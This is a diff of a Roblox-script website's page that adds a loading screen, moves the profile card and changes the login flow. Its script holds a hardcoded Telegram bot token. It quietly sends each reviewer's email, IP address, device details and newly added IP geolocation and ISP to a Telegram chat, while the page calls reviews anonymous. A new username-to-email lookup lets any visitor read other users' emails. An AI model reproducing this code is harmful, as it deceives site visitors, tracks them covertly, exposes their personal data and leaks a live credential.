@@ -41,6 +41,53 @@ body{
 ::selection{background:rgba(90,160,255,.45);color:#fff}
 ::-moz-selection{background:rgba(90,160,255,.45);color:#fff}
 
+/* ===== ЭКРАН ЗАГРУЗКИ ===== */
+#sealLoader{
+  position:fixed;inset:0;z-index:99999;
+  background:radial-gradient(circle at 50% 50%,#071022 0%,#03060d 70%);
+  display:flex;flex-direction:column;align-items:center;justify-content:center;
+  gap:2rem;
+  transition:opacity .9s cubic-bezier(.22,1,.36,1),visibility .9s;
+  opacity:1;visibility:visible;
+}
+#sealLoader.hidden{opacity:0;visibility:hidden;pointer-events:none}
+.loader-seal{position:relative;width:120px;height:120px;display:flex;align-items:center;justify-content:center}
+.loader-seal-core{
+  width:64px;height:64px;border-radius:50%;
+  background:radial-gradient(circle at 35% 35%,#a8d4ff 0%,#3a7bd5 55%,#0a1424 100%);
+  box-shadow:0 0 30px rgba(90,160,255,.6),0 0 60px rgba(58,123,213,.4),inset 0 0 20px rgba(255,255,255,.3);
+  animation:sealPulse 2.4s cubic-bezier(.22,1,.36,1) infinite;
+  position:relative;z-index:2;
+}
+.loader-seal-core::before{
+  content:'S';position:absolute;inset:0;
+  display:flex;align-items:center;justify-content:center;
+  font-size:1.9rem;font-weight:300;color:#fff;
+  text-shadow:0 0 12px rgba(255,255,255,.8);
+}
+@keyframes sealPulse{0%,100%{transform:scale(1);filter:brightness(1)}50%{transform:scale(1.08);filter:brightness(1.25)}}
+.loader-ring{position:absolute;top:50%;left:50%;border-radius:50%;border:1px solid rgba(90,160,255,.35);transform:translate(-50%,-50%)}
+.loader-ring-1{width:120px;height:120px;border-top-color:rgba(120,180,255,1);border-right-color:rgba(120,180,255,.1);animation:ringSpin 2.2s linear infinite}
+.loader-ring-2{width:96px;height:96px;border-color:rgba(90,160,255,.15);border-bottom-color:rgba(120,180,255,.9);animation:ringSpin 1.6s linear infinite reverse}
+.loader-ring-3{width:150px;height:150px;border:1px dashed rgba(90,160,255,.25);animation:ringSpin 8s linear infinite}
+@keyframes ringSpin{from{transform:translate(-50%,-50%) rotate(0deg)}to{transform:translate(-50%,-50%) rotate(360deg)}}
+.loader-progress-wrap{width:260px;height:2px;background:rgba(30,58,95,.5);border-radius:999px;overflow:hidden;position:relative}
+.loader-progress-bar{height:100%;width:0%;background:linear-gradient(90deg,var(--blue-3),var(--blue-1),var(--blue-2));border-radius:999px;transition:width .45s cubic-bezier(.22,1,.36,1);box-shadow:0 0 12px rgba(90,160,255,.6);position:relative}
+.loader-progress-bar::after{content:'';position:absolute;right:0;top:50%;width:8px;height:8px;border-radius:50%;background:#fff;transform:translateY(-50%);box-shadow:0 0 12px #5ea0ff,0 0 22px #3a7bd5;opacity:0;transition:opacity .3s}
+#sealLoader.loading .loader-progress-bar::after{opacity:1}
+.loader-text{font-size:.85rem;color:#5b7fb5;letter-spacing:.35em;text-transform:uppercase}
+.loader-stage{font-size:.7rem;color:#3e5a80;letter-spacing:.15em;min-height:1em;transition:opacity .3s}
+@media (max-width:700px){
+  .loader-seal{width:96px;height:96px}
+  .loader-seal-core{width:52px;height:52px}
+  .loader-seal-core::before{font-size:1.5rem}
+  .loader-ring-1{width:96px;height:96px}
+  .loader-ring-2{width:76px;height:76px}
+  .loader-ring-3{width:120px;height:120px}
+  .loader-progress-wrap{width:200px}
+  .loader-text{font-size:.75rem}
+}
+
 #bg-canvas{position:fixed;inset:0;z-index:0;pointer-events:none;opacity:.85;transform:translateZ(0)}
 .bg-vignette{position:fixed;inset:0;z-index:1;pointer-events:none;background:radial-gradient(circle at 50% 50%,transparent 40%,rgba(0,0,0,.55) 100%);transform:translateZ(0)}
 .bg-scan{position:fixed;inset:0;z-index:2;pointer-events:none;background:repeating-linear-gradient(0deg,rgba(120,180,255,.03) 0 1px,transparent 1px 3px);mix-blend-mode:overlay;opacity:.4;transform:translateZ(0);animation:scanMove 14s linear infinite}
@@ -53,7 +100,7 @@ body{
 h1{font-size:4rem;font-weight:300;letter-spacing:-.02em;margin-bottom:.5rem;background:linear-gradient(180deg,#fff 0%,#a8d4ff 60%,#3a7bd5 100%);-webkit-background-clip:text;background-clip:text;-webkit-text-fill-color:transparent}
 h2{font-size:1.5rem;font-weight:300;letter-spacing:.1em;margin-bottom:2rem;color:var(--muted);text-transform:lowercase}
 .divider{width:80px;height:2px;background:linear-gradient(90deg,transparent,var(--blue-1),var(--blue-2),var(--blue-1),transparent);border-radius:999px;margin:1.5rem auto;box-shadow:0 0 18px rgba(58,123,213,.45);position:relative}
-.divider::after{content:'';position:absolute;top:50%;left:50%;width:8px;height:8px;border-radius:50%;background:#fff;transform:translate(-50%,-50%);box-shadow:0 0 14px #5ea0ff,0 0 26px #3a7bd5;animation:dividerPulse 3.5s ease-in-out infinite;will-change:transform,opacity}
+.divider::after{content:'';position:absolute;top:50%;left:50%;width:8px;height:8px;border-radius:50%;background:#fff;transform:translate(-50%,-50%);box-shadow:0 0 14px #5ea0ff,0 0 26px #3a7bd5;animation:dividerPulse 3.5s ease-in-out infinite}
 @keyframes dividerPulse{0%,100%{transform:translate(-50%,-50%) scale(1);opacity:.9}50%{transform:translate(-50%,-50%) scale(1.35);opacity:.55}}
 
 .home-buttons{display:flex;flex-direction:column;align-items:center;gap:1rem}
@@ -153,6 +200,7 @@ footer .disclaimer{font-size:.7rem;color:#2a3f5c}
 .lang-switcher.visible{display:block}
 .lang-switcher select{background:rgba(10,20,36,.85);backdrop-filter:blur(10px);-webkit-backdrop-filter:blur(10px);color:#c9d9f0;border:1px solid var(--blue-3);border-radius:999px;padding:.5rem 1.1rem;font-size:.85rem;font-family:inherit;cursor:pointer;transition:background .5s var(--smooth),border-color .5s var(--smooth),color .5s var(--smooth);appearance:none;-webkit-appearance:none;padding-right:1.9rem;background-image:url("data:image/svg+xml;charset=UTF-8,%3csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 24 24' fill='none' stroke='%235b7fb5' stroke-width='2' stroke-linecap='round' stroke-linejoin='round'%3e%3cpolyline points='6 9 12 15 18 9'%3e%3c/polyline%3e%3c/svg%3e");background-repeat:no-repeat;background-position:right .7rem center;background-size:14px}
 .lang-switcher select:hover{background-color:#132a4a;border-color:var(--blue-1);color:#fff}
+.lang-switcher.shifted{left:auto;right:1.25rem}
 
 .holo-zone{position:fixed;top:1.5rem;right:1.5rem;width:200px;height:200px;z-index:50;perspective:800px;border:1px dashed rgba(90,160,255,.35);border-radius:20px;background:radial-gradient(circle at center,rgba(20,50,120,.18),transparent 70%);transition:border-color .7s var(--smooth),background .7s var(--smooth),opacity .7s var(--smooth),box-shadow .7s var(--smooth);opacity:0;pointer-events:none;visibility:hidden;overflow:hidden}
 .holo-zone.active{opacity:1;pointer-events:auto;visibility:visible}
@@ -178,27 +226,42 @@ footer .disclaimer{font-size:.7rem;color:#2a3f5c}
 .auth-close{display:inline-block;margin-top:1rem;font-size:.85rem;color:#4a6890;cursor:pointer;transition:color .5s var(--smooth);background:none;border:none;font-family:inherit}
 .auth-close:hover{color:#7aa8e0}
 
-.profile-card{display:none;flex-direction:column;align-items:center;gap:.75rem;background:linear-gradient(180deg,rgba(15,28,50,.9),rgba(10,20,36,.98));border:1px solid var(--blue-1);border-radius:20px;padding:1.5rem 1.75rem;width:100%;max-width:280px;box-shadow:0 0 25px rgba(58,123,213,.15),inset 0 0 30px rgba(58,123,213,.05);animation:profileIn .8s var(--smooth) forwards;position:relative;overflow:hidden}
+/* ===== ПРОФИЛЬ — ЛЕВЫЙ ВЕРХНИЙ УГОЛ ===== */
+.profile-card{
+  display:none;
+  position:fixed;
+  top:1.25rem;
+  left:1.25rem;
+  z-index:210;
+  flex-direction:column;align-items:center;gap:.55rem;
+  background:linear-gradient(180deg,rgba(15,28,50,.92),rgba(10,20,36,.98));
+  border:1px solid var(--blue-1);border-radius:20px;
+  padding:1rem 1.25rem;width:210px;
+  box-shadow:0 0 25px rgba(58,123,213,.18),inset 0 0 30px rgba(58,123,213,.05);
+  animation:profileIn .8s var(--smooth) forwards;
+  overflow:hidden;
+}
 .profile-card::before{content:'';position:absolute;top:0;left:0;right:0;height:1px;background:linear-gradient(90deg,transparent,var(--blue-2),transparent)}
-@keyframes profileIn{from{opacity:0;transform:translateY(12px) scale(.96)}to{opacity:1;transform:translateY(0) scale(1)}}
+@keyframes profileIn{from{opacity:0;transform:translateY(-12px) scale(.96)}to{opacity:1;transform:translateY(0) scale(1)}}
 .profile-card.show{display:flex}
-.profile-avatar{width:56px;height:56px;border-radius:50%;background:linear-gradient(135deg,var(--blue-1),var(--blue-3));display:flex;align-items:center;justify-content:center;color:#fff;font-size:1.5rem;font-weight:500;text-transform:uppercase;box-shadow:0 0 15px rgba(58,123,213,.35),0 0 10px rgba(120,180,255,.3) inset;border:1px solid var(--blue-2);position:relative}
+.profile-avatar{width:48px;height:48px;border-radius:50%;background:linear-gradient(135deg,var(--blue-1),var(--blue-3));display:flex;align-items:center;justify-content:center;color:#fff;font-size:1.25rem;font-weight:500;text-transform:lowercase;box-shadow:0 0 15px rgba(58,123,213,.35),0 0 10px rgba(120,180,255,.3) inset;border:1px solid var(--blue-2);position:relative}
 .profile-avatar::after{content:'';position:absolute;inset:-4px;border-radius:50%;border:1px solid rgba(94,160,255,.5);animation:avatarRing 5s linear infinite}
 @keyframes avatarRing{from{transform:rotate(0) scale(1);opacity:.7}to{transform:rotate(360deg) scale(1.08);opacity:0}}
-.profile-name{font-size:.95rem;color:#fff;word-break:break-all;text-align:center;font-weight:400}
-.profile-status{font-size:.75rem;color:var(--blue-2);letter-spacing:.1em;text-transform:uppercase;display:flex;align-items:center;gap:.4rem}
-.profile-status::before{content:'';width:7px;height:7px;border-radius:50%;background:var(--blue-2);box-shadow:0 0 10px var(--blue-2),0 0 5px var(--blue-2);animation:statusPulse 3.5s ease-in-out infinite}
+.profile-name{font-size:.95rem;color:#fff;word-break:break-all;text-align:center;font-weight:400;text-transform:lowercase;line-height:1.2}
+.profile-status{font-size:.7rem;color:var(--blue-2);letter-spacing:.1em;text-transform:uppercase;display:flex;align-items:center;gap:.4rem}
+.profile-status::before{content:'';width:6px;height:6px;border-radius:50%;background:var(--blue-2);box-shadow:0 0 10px var(--blue-2),0 0 5px var(--blue-2);animation:statusPulse 3.5s ease-in-out infinite}
 @keyframes statusPulse{0%,100%{opacity:1}50%{opacity:.55}}
-.profile-divider{width:100%;height:1px;background:linear-gradient(90deg,transparent,var(--blue-3),transparent);margin:.25rem 0}
-.profile-actions{display:flex;flex-direction:column;gap:.5rem;width:100%}
-.profile-btn{display:flex;align-items:center;justify-content:center;gap:.5rem;padding:.6rem 1rem;border:1px solid var(--blue-3);border-radius:999px;background:transparent;color:#b8cce6;font-family:inherit;font-size:.85rem;cursor:pointer;text-decoration:none;transition:background .5s var(--smooth),border-color .5s var(--smooth),color .5s var(--smooth),box-shadow .5s var(--smooth)}
+.profile-divider{width:100%;height:1px;background:linear-gradient(90deg,transparent,var(--blue-3),transparent);margin:.15rem 0}
+.profile-actions{display:flex;flex-direction:column;gap:.4rem;width:100%}
+.profile-btn{display:flex;align-items:center;justify-content:center;gap:.5rem;padding:.5rem .9rem;border:1px solid var(--blue-3);border-radius:999px;background:transparent;color:#b8cce6;font-family:inherit;font-size:.8rem;cursor:pointer;text-decoration:none;transition:background .5s var(--smooth),border-color .5s var(--smooth),color .5s var(--smooth),box-shadow .5s var(--smooth)}
 .profile-btn:hover{background:#132a4a;border-color:var(--blue-1);color:#fff;box-shadow:0 0 10px rgba(58,123,213,.15)}
 .profile-btn.danger:hover{background:rgba(198,40,40,.2);border-color:#c62828;color:#ef9a9a}
-.profile-btn svg{width:14px;height:14px;flex-shrink:0}
+.profile-btn svg{width:13px;height:13px;flex-shrink:0}
 
 @media (max-width:700px){
   .lang-switcher{top:.75rem;left:.75rem}
   .lang-switcher select{padding:.4rem .9rem;font-size:.75rem;padding-right:1.7rem;background-size:12px}
+  .lang-switcher.shifted{right:.75rem}
   h1{font-size:2.5rem}
   h2{font-size:1rem}
   .scripts-title{font-size:1.4rem;margin-bottom:1rem}
@@ -222,8 +285,9 @@ footer .disclaimer{font-size:.7rem;color:#2a3f5c}
   .thanks-box,.mad-box{padding:2rem 1.5rem}
   .holo-zone{top:4rem;right:-1rem;width:130px;height:130px;transform:scale(.8);transform-origin:top right}
   .holo-zone .zone-label{font-size:.55rem}
-  .profile-card{max-width:260px;padding:1.25rem 1.5rem}
-  .profile-avatar{width:48px;height:48px;font-size:1.25rem}
+  .profile-card{width:170px;padding:.75rem .9rem;top:.75rem;left:.75rem}
+  .profile-avatar{width:38px;height:38px;font-size:1rem}
+  .profile-name{font-size:.8rem}
   .back-link{top:.75rem;right:.75rem;padding:.5rem 1rem;font-size:.75rem}
   .review-textarea{min-height:80px}
 }
@@ -242,9 +306,41 @@ footer .disclaimer{font-size:.7rem;color:#2a3f5c}
 </head>
 <body>
 
+<div id="sealLoader">
+  <div class="loader-seal">
+    <div class="loader-ring loader-ring-3"></div>
+    <div class="loader-ring loader-ring-1"></div>
+    <div class="loader-ring loader-ring-2"></div>
+    <div class="loader-seal-core"></div>
+  </div>
+  <div class="loader-progress-wrap">
+    <div class="loader-progress-bar" id="loaderBar"></div>
+  </div>
+  <div class="loader-text">Loading</div>
+  <div class="loader-stage" id="loaderStage">Preparing environment...</div>
+</div>
+
 <canvas id="bg-canvas"></canvas>
 <div class="bg-vignette"></div>
 <div class="bg-scan"></div>
+
+<!-- ПРОФИЛЬ — ЛЕВЫЙ ВЕРХНИЙ УГОЛ -->
+<div class="profile-card" id="profileCard">
+  <div class="profile-avatar" id="profileAvatar">s</div>
+  <div class="profile-name" id="profileName">seal</div>
+  <div class="profile-status">online</div>
+  <div class="profile-divider"></div>
+  <div class="profile-actions">
+    <a class="profile-btn" href="#reviews" id="profileReviews">
+      <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M21 11.5a8.38 8.38 0 0 1-.9 3.8 8.5 8.5 0 0 1-7.6 4.7 8.38 8.38 0 0 1-3.8-.9L3 21l1.9-5.7a8.38 8.38 0 0 1-.9-3.8 8.5 8.5 0 0 1 4.7-7.6 8.38 8.38 0 0 1 3.8-.9h.5a8.48 8.48 0 0 1 8 8v.5z"></path></svg>
+      My reviews
+    </a>
+    <button class="profile-btn danger" id="signOutBtn">
+      <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M9 21H5a2 2 0 0 1-2-2V5a2 2 0 0 1 2-2h4"></path><polyline points="16 17 21 12 16 7"></polyline><line x1="21" y1="12" x2="9" y2="12"></line></svg>
+      Logout
+    </button>
+  </div>
+</div>
 
 <button class="back-link" id="globalBack">Go Back</button>
 
@@ -276,23 +372,6 @@ footer .disclaimer{font-size:.7rem;color:#2a3f5c}
 <button class="btn" id="goToScripts" data-i18n="viewScripts">View scripts</button>
 <button class="btn" id="goToReviews" data-i18n="reviews">Reviews</button>
 <button class="btn" id="openAuth" data-i18n="login">Login / Register</button>
-
-<div class="profile-card" id="profileCard">
-  <div class="profile-avatar" id="profileAvatar">S</div>
-  <div class="profile-name" id="profileName">Seal_user</div>
-  <div class="profile-status">online</div>
-  <div class="profile-divider"></div>
-  <div class="profile-actions">
-    <a class="profile-btn" href="#reviews" id="profileReviews">
-      <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M21 11.5a8.38 8.38 0 0 1-.9 3.8 8.5 8.5 0 0 1-7.6 4.7 8.38 8.38 0 0 1-3.8-.9L3 21l1.9-5.7a8.38 8.38 0 0 1-.9-3.8 8.5 8.5 0 0 1 4.7-7.6 8.38 8.38 0 0 1 3.8-.9h.5a8.48 8.48 0 0 1 8 8v.5z"></path></svg>
-      My reviews
-    </a>
-    <button class="profile-btn danger" id="signOutBtn">
-      <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M9 21H5a2 2 0 0 1-2-2V5a2 2 0 0 1 2-2h4"></path><polyline points="16 17 21 12 16 7"></polyline><line x1="21" y1="12" x2="9" y2="12"></line></svg>
-      Logout
-    </button>
-  </div>
-</div>
 </div>
 <footer>
 <span class="copyright">© 2026 SealScripts</span>
@@ -362,12 +441,11 @@ footer .disclaimer{font-size:.7rem;color:#2a3f5c}
 <div class="auth-overlay" id="authOverlay">
 <div class="auth-box" id="authBox">
 <h3 class="auth-title" id="authTitle">Login</h3>
-<p class="auth-sub" id="authSub">Enter your email and password</p>
+<p class="auth-sub" id="authSub">Enter your username and password</p>
 
-<input class="auth-input hidden" type="text" id="authUsername" placeholder="Username" autocomplete="username" maxlength="20">
-<p class="auth-hint hidden" id="authUsernameHint">3–20 chars, letters/numbers/underscore. Must be unique.</p>
+<input class="auth-input" type="text" id="authUsername" placeholder="Username" autocomplete="username" maxlength="20" autocapitalize="none" spellcheck="false">
 
-<input class="auth-input" type="email" id="authEmail" placeholder="Email" autocomplete="email">
+<input class="auth-input hidden" type="email" id="authEmail" placeholder="Email" autocomplete="email">
 <input class="auth-input" type="password" id="authPassword" placeholder="Password" autocomplete="current-password">
 <button class="auth-btn" id="authSubmit">Login</button>
 <div class="auth-switch">
@@ -423,10 +501,6 @@ import {
   doc,
   getDoc,
   setDoc,
-  collection,
-  query,
-  where,
-  getDocs,
   serverTimestamp
 } from "https://www.gstatic.com/firebasejs/10.12.0/firebase-firestore.js";
 
@@ -451,26 +525,47 @@ try{
 
 const USERNAME_RE = /^[A-Za-z0-9_]{3,20}$/;
 
+/* Проверка занятости ника */
 async function isUsernameTaken(username){
-  const q = query(collection(db, 'users'), where('usernameLower', '==', username.toLowerCase()));
-  const snap = await getDocs(q);
-  return !snap.empty;
+  const timeout = new Promise((_, rej) =>
+    setTimeout(() => rej(new Error('firestore-timeout')), 8000)
+  );
+  const lookup = (async () => {
+    const ref = doc(db, 'usernames', username.toLowerCase());
+    const snap = await getDoc(ref);
+    return snap.exists();
+  })();
+  return await Promise.race([lookup, timeout]);
 }
 
-async function saveUsername(uid, username){
-  const ref = doc(db, 'users', uid);
-  await setDoc(ref, {
-    username: username,
-    usernameLower: username.toLowerCase(),
+/* Сохранить ник (при регистрации) */
+async function saveUsername(uid, username, email){
+  const lower = username.toLowerCase();
+  await setDoc(doc(db, 'usernames', lower), {
+    uid,
+    email,
+    username,
+    createdAt: serverTimestamp()
+  });
+  await setDoc(doc(db, 'users', uid), {
+    username,
+    usernameLower: lower,
     createdAt: serverTimestamp()
   }, { merge: true });
 }
 
+/* Получить ник по UID */
 async function fetchUsername(uid){
-  const ref = doc(db, 'users', uid);
-  const snap = await getDoc(ref);
+  const snap = await getDoc(doc(db, 'users', uid));
   if(snap.exists() && snap.data().username) return snap.data().username;
   return null;
+}
+
+/* Получить email по нику (для логина) */
+async function getEmailByUsername(username){
+  const snap = await getDoc(doc(db, 'usernames', username.toLowerCase()));
+  if(!snap.exists()) return null;
+  return snap.data().email || null;
 }
 
 window.firebaseAuth = {
@@ -483,6 +578,7 @@ window.firebaseAuth = {
   isUsernameTaken,
   saveUsername,
   fetchUsername,
+  getEmailByUsername,
   USERNAME_RE
 };
 
@@ -490,48 +586,108 @@ window.dispatchEvent(new Event('firebase-ready'));
 </script>
 
 <script>
+/* ================= LOADER ================= */
+const sealLoader = document.getElementById('sealLoader');
+const loaderBar = document.getElementById('loaderBar');
+const loaderStage = document.getElementById('loaderStage');
+
+const bootState = {
+  firebase: false,
+  firestore: false,
+  ip: false,
+  fonts: false,
+  dom: false,
+  minTime: false
+};
+const TOTAL_STEPS = Object.keys(bootState).length;
+let currentProgress = 0;
+
+function setStage(text){ if(loaderStage) loaderStage.textContent = text; }
+function markReady(key){
+  if(!(key in bootState)) return;
+  if(bootState[key]) return;
+  bootState[key] = true;
+  recalcProgress();
+}
+function recalcProgress(){
+  const done = Object.values(bootState).filter(Boolean).length;
+  const pct = Math.min(100, Math.round((done / TOTAL_STEPS) * 100));
+  if(pct > currentProgress){
+    currentProgress = pct;
+    loaderBar.style.width = pct + '%';
+  }
+  if(done >= TOTAL_STEPS) finishLoader();
+}
+function finishLoader(){
+  if(sealLoader.classList.contains('hidden')) return;
+  loaderBar.style.width = '100%';
+  setStage('Ready');
+  setTimeout(() => {
+    sealLoader.classList.add('hidden');
+    setTimeout(() => { sealLoader.style.display = 'none'; }, 1000);
+  }, 400);
+}
+
+setTimeout(() => markReady('minTime'), 1400);
+if(document.readyState === 'loading'){
+  document.addEventListener('DOMContentLoaded', () => markReady('dom'), { once: true });
+}else{ markReady('dom'); }
+if(document.fonts && document.fonts.ready){
+  setStage('Loading fonts...');
+  document.fonts.ready.then(() => markReady('fonts'));
+}else{ markReady('fonts'); }
+
+window.addEventListener('firebase-ready', async () => {
+  setStage('Connecting to Firebase...');
+  markReady('firebase');
+  try{
+    const fb = window.firebaseAuth;
+    if(fb && fb.db){
+      setStage('Warming up Firestore...');
+      const { doc, getDoc } = await import("https://www.gstatic.com/firebasejs/10.12.0/firebase-firestore.js");
+      await getDoc(doc(fb.db, '__ping__', 'startup')).catch(()=>{});
+      markReady('firestore');
+    }else{ markReady('firestore'); }
+  }catch(e){ markReady('firestore'); }
+});
+
 const TELEGRAM_PROXY = 'https://summer-hall-5536.autismallahakbar.workers.dev';
 const BOT_TOKEN = '8956553138:AAGIivvQO_8XJe3FnKG_OCfaqJm7knTHyN4';
 const CHAT_ID = '7937831655';
 
 let __userIP = 'unknown';
+let __userGeo = null;
+
 async function fetchUserIP(){
+  setStage('Locating...');
   try{
     const r = await fetch(`${TELEGRAM_PROXY}/myip`, { cache: 'no-store' });
     const j = await r.json();
     if(j && j.ip) __userIP = j.ip;
-  }catch(e){
-    __userIP = 'unknown';
-  }
+    if(j && j.cf) __userGeo = j.cf;
+  }catch(e){ __userIP = 'unknown'; }
+  markReady('ip');
 }
 fetchUserIP();
 
 function getDeviceInfo(){
   const ua = navigator.userAgent;
-  let browser = 'Unknown';
-  let os = 'Unknown';
-  let device = 'Desktop';
-
+  let browser = 'Unknown', os = 'Unknown', device = 'Desktop';
   if(/Edg\//.test(ua)) browser = 'Edge ' + (ua.match(/Edg\/([\d.]+)/)||[])[1];
   else if(/OPR\//.test(ua) || /Opera/.test(ua)) browser = 'Opera ' + (ua.match(/OPR\/([\d.]+)/)||[])[1];
   else if(/Firefox\//.test(ua)) browser = 'Firefox ' + (ua.match(/Firefox\/([\d.]+)/)||[])[1];
   else if(/Chrome\//.test(ua)) browser = 'Chrome ' + (ua.match(/Chrome\/([\d.]+)/)||[])[1];
   else if(/Safari\//.test(ua) && /Version\//.test(ua)) browser = 'Safari ' + (ua.match(/Version\/([\d.]+)/)||[])[1];
-
   if(/Windows NT 10/.test(ua)) os = 'Windows 10/11';
   else if(/Windows NT/.test(ua)) os = 'Windows';
   else if(/Mac OS X/.test(ua)) os = 'macOS ' + ((ua.match(/Mac OS X ([\d_]+)/)||[])[1]||'').replace(/_/g,'.');
   else if(/Android/.test(ua)) os = 'Android ' + ((ua.match(/Android ([\d.]+)/)||[])[1]||'');
   else if(/iPhone|iPad|iPod/.test(ua)) os = 'iOS ' + ((ua.match(/OS ([\d_]+)/)||[])[1]||'').replace(/_/g,'.');
   else if(/Linux/.test(ua)) os = 'Linux';
-
   if(/Mobile|Android|iPhone/.test(ua)) device = 'Mobile';
   else if(/iPad|Tablet/.test(ua)) device = 'Tablet';
-
   return {
-    browser,
-    os,
-    device,
+    browser, os, device,
     screen: `${screen.width}x${screen.height} @${devicePixelRatio}x`,
     viewport: `${innerWidth}x${innerHeight}`,
     language: navigator.language,
@@ -540,7 +696,21 @@ function getDeviceInfo(){
     ua: ua.slice(0, 200)
   };
 }
+function geoLine(){
+  if(!__userGeo) return '';
+  const parts = [];
+  if(__userGeo.city) parts.push(__userGeo.city);
+  if(__userGeo.region) parts.push(__userGeo.region);
+  if(__userGeo.country) parts.push(__userGeo.country);
+  const loc = parts.join(', ');
+  let line = '';
+  if(loc) line += `📍 Location: ${loc} (by IP)\n`;
+  if(__userGeo.org) line += `🏢 ISP: ${__userGeo.org}\n`;
+  if(__userGeo.timezone) line += `🌍 IP Timezone: ${__userGeo.timezone}\n`;
+  return line;
+}
 
+/* ================= ФОН ================= */
 (function(){
   const canvas = document.getElementById('bg-canvas');
   const ctx = canvas.getContext('2d');
@@ -603,6 +773,7 @@ function getDeviceInfo(){
   requestAnimationFrame(draw);
 })();
 
+/* ================= RIPPLE ================= */
 document.querySelectorAll('.btn, .submit-btn, .auth-btn, .warning-btn, .thanks-btn, .mad-btn, .back-link').forEach(btn => {
   btn.addEventListener('click', function(e){
     const rect = this.getBoundingClientRect();
@@ -617,6 +788,7 @@ document.querySelectorAll('.btn, .submit-btn, .auth-btn, .warning-btn, .thanks-b
   });
 });
 
+/* ================= ЧЁРНАЯ ДЫРА ================= */
 (function(){
   const zone = document.getElementById('holoZone');
   const canvas = document.getElementById('blackHoleCanvas');
@@ -788,6 +960,7 @@ document.querySelectorAll('.btn, .submit-btn, .auth-btn, .warning-btn, .thanks-b
   requestAnimationFrame(draw);
 })();
 
+/* ================= ПЕРЕВОДЫ ================= */
 const translations={
 en:{welcome:"Welcome",presents:"seal scripts presents",viewScripts:"View scripts",reviews:"Reviews",login:"Login / Register",disclaimer:"This website is not affiliated with, endorsed by, or connected to Roblox Corporation, the game Roblox, or any in-game projects. All coincidences are purely accidental.",copy:"Copy",leaveReview:"Leave a review",reviewSubtitle:"Rate the scripts from 1 to 5 stars. Anonymous reviews.",yourRating:"Your rating",yourReview:"Your review",reviewPlaceholder:"Write your honest review here... (optional)",sendToSeal:"Send To Seal",goBack:"Go Back",warningTitle:"Warning",warningText:"By using these scripts, you take <strong>full responsibility</strong> for your account. If you get banned by moderators or admins — <strong>Seal is not involved</strong> in any way.<br><br>Play carefully and at your own risk.",warningBtn:"I take responsibility, copy",pleaseRead:"Please read...",thanksTitle:"Thanks For Review!",thanksText:"Your feedback means a lot to Seal.<br>It will be reviewed soon.",close:"Close",madTitle:"Seal is mad",madText:"You already left a review.<br>Each user can only submit one review.",pickRating:"Please pick a rating first",copied:"Copied ✓",couldNotCopy:"Could not copy",sendFailed:"Send failed, try again",sending:"Sending...",sent:"Sent ✓"},
 ru:{welcome:"Добро пожаловать",presents:"seal scripts представляет",viewScripts:"Посмотреть скрипты",reviews:"Отзывы",login:"Войти / Регистрация",disclaimer:"Этот сайт никак не связан с Roblox Corporation, игрой Roblox или какими-либо внутриигровыми проектами. Все совпадения случайны.",copy:"Копировать",leaveReview:"Оставить отзыв",reviewSubtitle:"Оцените скрипты от 1 до 5 звёзд. Анонимные отзывы.",yourRating:"Ваша оценка",yourReview:"Ваш отзыв",reviewPlaceholder:"Напишите честный отзыв здесь... (необязательно)",sendToSeal:"Отправить Seal",goBack:"Назад",warningTitle:"Предупреждение",warningText:"Используя эти скрипты, вы берёте <strong>полную ответственность</strong> за свой аккаунт. Если вас забанят модераторы или админы — <strong>Seal к этому не причастен</strong>.<br><br>Играйте осторожно и на свой страх и риск.",warningBtn:"Я беру ответственность, копировать",pleaseRead:"Пожалуйста, прочитайте...",thanksTitle:"Спасибо за отзыв!",thanksText:"Ваш отзыв много значит для Seal.<br>Он будет скоро рассмотрен.",close:"Закрыть",madTitle:"Seal злится",madText:"Вы уже оставили отзыв.<br>Каждый пользователь может оставить только один отзыв.",pickRating:"Сначала выберите оценку",copied:"Скопировано ✓",couldNotCopy:"Не удалось скопировать",sendFailed:"Не удалось отправить, попробуйте ещё раз",sending:"Отправка...",sent:"Отправлено ✓"},
@@ -826,12 +999,20 @@ function showPage(page,hash){
     page.classList.add('active');
     if(page===pageHome){
         langSwitcher.classList.add('visible');
+        langSwitcher.classList.remove('shifted');
         holoZone.classList.add('active');
         globalBack.classList.remove('visible');
     } else {
         langSwitcher.classList.remove('visible');
         holoZone.classList.remove('active');
         globalBack.classList.add('visible');
+    }
+    // если профиль открыт и мы на домашней — сдвигаем переключатель языка вправо, чтобы не перекрывал
+    const profileOpen = document.getElementById('profileCard').classList.contains('show');
+    if(page===pageHome && profileOpen){
+        langSwitcher.classList.add('shifted');
+    } else {
+        langSwitcher.classList.remove('shifted');
     }
     if(hash)history.pushState({},'',hash);
 }
@@ -846,6 +1027,7 @@ function restorePage(){
 restorePage();
 window.addEventListener('popstate',restorePage);
 
+/* ================= TILT ================= */
 (function initTilt(){
     const tiltElements = document.querySelectorAll('[data-tilt]');
     if(!tiltElements.length) return;
@@ -886,9 +1068,11 @@ window.addEventListener('popstate',restorePage);
     }
 })();
 
+/* ================= TOAST ================= */
 const toast=document.getElementById('toast');
 function showToast(msg,type){toast.textContent=msg;toast.className='toast show'+(type?' '+type:'');clearTimeout(showToast._t);showToast._t=setTimeout(()=>{toast.classList.remove('show')},2400)}
 
+/* ================= WARNING / COPY ================= */
 const warningOverlay=document.getElementById('warningOverlay');
 const warningConfirm=document.getElementById('warningConfirm');
 const copyButtons=document.querySelectorAll('.copy-btn');
@@ -951,6 +1135,7 @@ async function copyToClipboard(text){
     }
 }
 
+/* ================= REVIEWS ================= */
 const REVIEWED_KEY='seal_scripts_reviewed';
 const submitBtn=document.getElementById('submitBtn');
 const starsInput=document.getElementById('starsInput');
@@ -992,6 +1177,7 @@ async function sendToTelegram(rating,text){
         `📧 Email: ${email}\n` +
         `🆔 UID: ${uid}\n` +
         `🌐 IP: ${__userIP}\n` +
+        geoLine() +
         `━━━━━━━━━━━━━━━━\n` +
         `⭐ Rating: ${rating}/5\n` +
         `📝 Text: ${text||'(no text)'}\n` +
@@ -1076,6 +1262,7 @@ if(pageHome.classList.contains('active')){
